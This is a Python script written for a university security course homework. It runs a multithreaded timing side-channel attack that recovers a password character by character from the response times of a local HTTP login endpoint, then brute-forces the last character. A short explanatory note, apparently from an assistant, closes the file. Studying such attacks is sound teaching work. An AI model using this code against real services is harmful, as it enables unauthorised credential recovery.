#!/usr/bin/env python3
"""
Timing Side-Channel Attack Script - SIMPLIFIED MULTI-THREADED
==============================================================
Based on proven simple sum-and-average approach with thread safety.

Author: df
Course: Attacks on Implementations of Secure Systems
Assignment: Homework 1 - Temporal Side-Channel
"""

import argparse
import requests
import time
import logging
from typing import List, Tuple, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime
import sys
import threading


# ============================================================================
# CONFIGURATION CONSTANTS
# ============================================================================

DEFAULT_USERNAME = "316279942"
DEFAULT_DIFFICULTY = 1
DEFAULT_SERVER = "http://127.0.0.1"
DEFAULT_PORT = 80

# Simplified parameters
DEFAULT_BASE_SAMPLES = 4
DEFAULT_THREADS = 4            # Conservative for stability
MAX_PASSWORD_LENGTH = 32
LENGTH_DETECTION_SAMPLES = 4

# Character set
CHARSET = "abcdefghijklmnopqrstuvwxyz"

# Request timeout
REQUEST_TIMEOUT = 80

# Thread-local storage for sessions
thread_local = threading.local()


# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class CharacterResult:
    """Simple result for a character test."""
    character: str
    total_time: float      # Sum of all samples
    samples: int
    average_time: float    # total_time / samples
    sample_times: List[float]  # Individual measurements


# ============================================================================
# LOGGING SETUP
# ============================================================================

def setup_logging(username: str) -> str:
    """Setup logging configuration."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    log_filename = f"timing_attack_{username}_{timestamp}.log"

    file_handler = logging.FileHandler(log_filename)
    file_handler.setLevel(logging.DEBUG)
    file_formatter = logging.Formatter(
        '%(asctime)s - %(levelname)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    file_handler.setFormatter(file_formatter)

    console_handler = logging.StreamHandler(sys.stderr)
    console_handler.setLevel(logging.INFO)
    console_formatter = logging.Formatter('%(message)s')
    console_handler.setFormatter(console_formatter)

    logger = logging.getLogger()
    logger.setLevel(logging.DEBUG)
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)

    logging.getLogger('urllib3').setLevel(logging.WARNING)
    logging.getLogger('requests').setLevel(logging.WARNING)

    return log_filename


# ============================================================================
# SESSION MANAGEMENT - THREAD-SAFE
# ============================================================================

def get_thread_session() -> requests.Session:
    """Get a session for the current thread."""
    if not hasattr(thread_local, 'session'):
        thread_local.session = requests.Session()
        thread_local.session.headers.update({'Connection': 'keep-alive'})
    return thread_local.session


# ============================================================================
# SIMPLE TIMING MEASUREMENT (like your working code)
# ============================================================================

def test_character_simple(
    url: str,
    username: str,
    test_password: str,
    difficulty: int,
    samples: int,
    char: str,
    position: int
) -> CharacterResult:
    """
    Test a single character using simple sum-and-average approach.
    This matches your working code's logic.
    """
    session = get_thread_session()

    params = {
        'user': username,
        'password': test_password,
        'difficulty': difficulty
    }

    total_time = 0.0
    sample_times = []

    logging.debug(f"Testing '{char}' for position {position}, password='{test_password}'")

    for sample_num in range(samples):
        try:
            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)

            # Use response.elapsed.total_seconds() like your working code
            elapsed = response.elapsed.total_seconds()
            total_time += elapsed
            sample_times.append(elapsed)

            logging.debug(f"  Sample {sample_num + 1}/{samples} for '{char}': {elapsed:.6f}s "
                         f"(running total: {total_time:.6f}s, running avg: {total_time/(sample_num+1):.6f}s)")

        except requests.exceptions.RequestException as e:
            logging.error(f"Request failed for '{char}': {e}")
            # Don't add to total on error

    avg_time = total_time / samples if samples > 0 else 0.0

    logging.debug(f"Finished testing '{char}' for position {position}: "
                 f"total={total_time:.6f}s, avg={avg_time:.6f}s")

    return CharacterResult(
        character=char,
        total_time=total_time,
        samples=samples,
        average_time=avg_time,
        sample_times=sample_times
    )


# ============================================================================
# PASSWORD LENGTH DETECTION
# ============================================================================

def detect_password_length(
    url: str,
    username: str,
    difficulty: int,
    max_length: int = MAX_PASSWORD_LENGTH,
    samples: int = LENGTH_DETECTION_SAMPLES
) -> int:
    """Detect password length using simple approach."""
    logging.info("[*] Detecting password length...")

    length_results = {}

    for length in range(1, max_length + 1):
        test_password = 'z' * length

        result = test_character_simple(
            url, username, test_password, difficulty, samples,
            f"len{length}", length
        )

        length_results[length] = result.average_time
        logging.debug(f"  Length {length:2d}: avg={result.average_time:.6f}s")

    # Find length with maximum average time
    detected_length = max(length_results, key=length_results.get)
    max_time = length_results[detected_length]

    sorted_lengths = sorted(length_results.items(), key=lambda x: x[1], reverse=True)
    logging.info(f"[+] Password length detected: {detected_length} characters (avg time: {max_time:.6f}s)")
    logging.info(f"  Top 5 length candidates:")
    for length, avg_time in sorted_lengths[:5]:
        logging.info(f"    Length {length:2d}: {avg_time:.6f}s")

    return detected_length


# ============================================================================
# CHARACTER CRACKING - SIMPLIFIED WITH OPTIONAL THREADING
# ============================================================================

def crack_character_at_position(
    url: str,
    username: str,
    current_password: str,
    position: int,
    password_length: int,
    difficulty: int,
    samples: int,
    use_threads: bool = True,
    max_workers: int = 4
) -> str:
    """
    Crack a single character position using simple sum-and-average.
    Matches your working code's logic but with optional threading.
    """
    logging.info(f"\n[Position {position}] Current password: '{current_password}' - Testing next character...")

    start_time = time.time()

    # Build test passwords for all characters
    char_results = {}

    if use_threads:
        # Multi-threaded testing
        logging.debug(f"  Testing {len(CHARSET)} characters with {max_workers} threads")

        def test_char(char):
            test_password = current_password + char + 'a' * (password_length - position)
            return test_character_simple(
                url, username, test_password, difficulty, samples, char, position
            )

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            futures = {executor.submit(test_char, char): char for char in CHARSET}

            for future in as_completed(futures):
                result = future.result()
                char_results[result.character] = result
    else:
        # Sequential testing (like your original code)
        logging.debug(f"  Testing {len(CHARSET)} characters sequentially")

        for char in CHARSET:
            test_password = current_password + char + 'a' * (password_length - position)
            result = test_character_simple(
                url, username, test_password, difficulty, samples, char, position
            )
            char_results[char] = result

    # Sort by average time (descending - slower is more likely correct)
    sorted_chars = sorted(char_results.keys(),
                         key=lambda c: char_results[c].average_time,
                         reverse=True)

    best_char = sorted_chars[0]
    best_avg = char_results[best_char].average_time

    elapsed = time.time() - start_time
    logging.info(f"  Testing completed in {elapsed:.2f}s")
    logging.info(f"\n  Top 5 candidates for position {position}:")

    for i, char in enumerate(sorted_chars[:5]):
        result = char_results[char]
        diff = result.average_time - best_avg

        logging.info(f"    #{i+1} Char: '{char}', "
                    f"Total Time: {result.total_time:.6f}s, "
                    f"Avg Time: {result.average_time:.6f}s, "
                    f"Diff from best: {diff:+.6f}s")

        # Show individual sample times
        samples_str = ', '.join([f'{t:.6f}' for t in result.sample_times])
        logging.debug(f"         Sample times: [{samples_str}]")

    logging.info(f"\n[+] Detected character at position {position}: '{best_char}'")

    return best_char


# ============================================================================
# LAST CHARACTER CHECK (exact match from your code)
# ============================================================================

def check_last_char(
    url: str,
    username: str,
    current_password: str,
    difficulty: int
) -> Optional[str]:
    """
    Check last character by brute force (looking for response='1').
    Exact implementation from your working code.
    """
    password_length = len(current_password) + 1
    logging.info(f"\n[Last Character] Testing position {password_length}...")
    logging.info(f"  Current password: '{current_password}'")

    session = get_thread_session()

    for char in CHARSET:
        test_password = current_password + char

        params = {
            'user': username,
            'password': test_password,
            'difficulty': difficulty
        }

        try:
            response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
            response_text = response.text.strip()

            logging.debug(f"  Char: '{char}', Response: '{response_text}'")

            if response_text == "1":
                logging.info(f"[SUCCESS] Found correct last character: '{char}'")
                return char

        except requests.exceptions.RequestException as e:
            logging.error(f"  Request failed for '{char}': {e}")

    logging.error("[FAILED] No correct last character found")
    return None


# ============================================================================
# MAIN CRACKING FUNCTION (based on your working code structure)
# ============================================================================

def crack_password(
    url: str,
    username: str,
    password_length: int,
    difficulty: int,
    samples: int = 4,
    resume_from: str = "",
    use_threads: bool = True,
    max_workers: int = 4
) -> str:
    """
    Main password cracking function.
    Based on your working crack_password_from_resuming logic.
    """
    current_password = resume_from
    start_time = time.time()

    logging.info("="*60)
    logging.info("STARTING PASSWORD CRACK")
    logging.info("="*60)
    logging.info(f"Password length: {password_length}")
    logging.info(f"Samples per char: {samples}")
    logging.info(f"Threading: {'enabled' if use_threads else 'disabled'}")
    if use_threads:
        logging.info(f"Max workers: {max_workers}")
    logging.info(f"Resume from: '{resume_from}' (length {len(resume_from)})")
    logging.info("="*60)

    # Crack each position
    for position in range(len(resume_from) + 1, password_length + 1):
        position_start = time.time()

        logging.info(f"\n{'='*60}")
        logging.info(f"Testing position {position}/{password_length}")
        logging.info(f"Elapsed time so far: {time.time() - start_time:.2f}s")
        logging.info(f"{'='*60}")

        # Check if this is the last character
        if position == password_length:
            last_char = check_last_char(url, username, current_password, difficulty)
            if last_char:
                current_password += last_char
                logging.info(f"\n[COMPLETE] Final password: '{current_password}'")
                return current_password
            else:
                logging.error("[ERROR] Failed to find last character, using timing attack...")
                # Fall through to timing attack

        # Use timing attack for this position
        best_char = crack_character_at_position(
            url, username, current_password, position, password_length,
            difficulty, samples, use_threads, max_workers
        )

        current_password += best_char

        position_time = time.time() - position_start
        logging.info(f"\n[Progress] Current password: '{current_password}' ({len(current_password)}/{password_length})")
        logging.info(f"           Position cracked in {position_time:.2f}s")

    total_time = time.time() - start_time

    logging.info(f"\n{'='*60}")
    logging.info(f"ATTACK COMPLETE")
    logging.info(f"{'='*60}")
    logging.info(f"Final password: {current_password}")
    logging.info(f"Total time: {total_time:.2f}s ({total_time/60:.2f} minutes)")
    logging.info(f"{'='*60}")

    return current_password


# ============================================================================
# VERIFICATION
# ============================================================================

def verify_password(url: str, username: str, password: str, difficulty: int) -> bool:
    """Verify if a password is correct."""
    logging.info(f"\n[*] Verifying password: '{password}'")

    session = get_thread_session()
    params = {
        'user': username,
        'password': password,
        'difficulty': difficulty
    }

    try:
        response = session.get(url, params=params, timeout=REQUEST_TIMEOUT)
        response_text = response.text.strip()

        if response_text == "1":
            logging.info("[SUCCESS] Password verified!")
            return True
        else:
            logging.error(f"[FAILED] Verification failed. Response: '{response_text}'")
            return False

    except Exception as e:
        logging.error(f"[ERROR] Verification request failed: {e}")
        return False


# ============================================================================
# COMMAND LINE INTERFACE
# ============================================================================

def parse_arguments() -> argparse.Namespace:
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(
        description="Timing Side-Channel Attack - Simplified Multi-Threaded",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument('--username', type=str, default=DEFAULT_USERNAME,
                       help=f'Username (default: {DEFAULT_USERNAME})')
    parser.add_argument('--difficulty', type=int, default=DEFAULT_DIFFICULTY,
                       help=f'Difficulty level (default: {DEFAULT_DIFFICULTY})')
    parser.add_argument('--server', type=str, default=DEFAULT_SERVER,
                       help=f'Server URL (default: {DEFAULT_SERVER})')
    parser.add_argument('--port', type=int, default=DEFAULT_PORT,
                       help=f'Server port (default: {DEFAULT_PORT})')
    parser.add_argument('--samples', type=int, default=DEFAULT_BASE_SAMPLES,
                       help=f'Samples per character (default: {DEFAULT_BASE_SAMPLES})')
    parser.add_argument('--length', type=int, default=None,
                       help='Password length (required if not auto-detecting)')
    parser.add_argument('--detect-length', action='store_true',
                       help='Auto-detect password length')
    parser.add_argument('--resume', type=str, default="",
                       help='Resume from partial password (e.g., "abc")')
    parser.add_argument('--threads', type=int, default=DEFAULT_THREADS,
                       help=f'Number of threads (0=sequential, default: {DEFAULT_THREADS})')

    return parser.parse_args()


def main():
    """Main entry point."""
    import sys
    import io
    if sys.platform == 'win32':
        sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
        sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')

    args = parse_arguments()

    # Construct URL
    url = f"{args.server}:{args.port}" if args.port != 80 else args.server
    if not url.startswith('http'):
        url = f"http://{url}"

    # Setup logging
    log_file = setup_logging(args.username)

    logging.info("="*60)
    logging.info("TIMING SIDE-CHANNEL ATTACK - SIMPLIFIED")
    logging.info("="*60)
    logging.info(f"Target URL:  {url}")
    logging.info(f"Username:    {args.username}")
    logging.info(f"Difficulty:  {args.difficulty}")
    logging.info(f"Samples:     {args.samples}")
    logging.info(f"Threads:     {args.threads if args.threads > 0 else 'Sequential'}")
    logging.info(f"Log file:    {log_file}")
    logging.info("="*60 + "\n")

    try:
        # Detect or use specified length
        if args.detect_length:
            password_length = detect_password_length(
                url, args.username, args.difficulty
            )
        elif args.length:
            password_length = args.length
            logging.info(f"[*] Using specified password length: {password_length}")
        else:
            logging.error("[ERROR] Must specify --length or use --detect-length")
            sys.exit(1)

        # Crack password
        use_threads = args.threads > 0
        password = crack_password(
            url=url,
            username=args.username,
            password_length=password_length,
            difficulty=args.difficulty,
            samples=args.samples,
            resume_from=args.resume,
            use_threads=use_threads,
            max_workers=args.threads if use_threads else 1
        )

        # Verify
        verify_password(url, args.username, password, args.difficulty)

        # Output only password to stdout (for grading)
        print(password)

    except KeyboardInterrupt:
        logging.error("\n[!] Interrupted by user")
        sys.exit(1)

    except Exception as e:
        logging.error(f"\n[!] Error: {e}")
        logging.exception("Traceback:")
        sys.exit(1)


if __name__ == "__main__":
    main()

'''
**Key Changes Based on Your Working Code:**

1. **Simple Sum-and-Average** (like yours):
   - No fancy statistics, outlier filtering, or z-scores
   - Just sum up all sample times and divide by sample count
   - Sort by average time (descending)

2. **Using `response.elapsed.total_seconds()`** (like yours):
   - More reliable than `perf_counter()`
   - This is what requests library reports

3. **Enhanced Logging** (as you requested):
```
   Sample 1/4 for 'a': 0.012345s (running total: 0.012345s, running avg: 0.012345s)
   Sample 2/4 for 'a': 0.013456s (running total: 0.025801s, running avg: 0.012901s)
   ...
   Finished testing 'a': total=0.051234s, avg=0.012809s
'''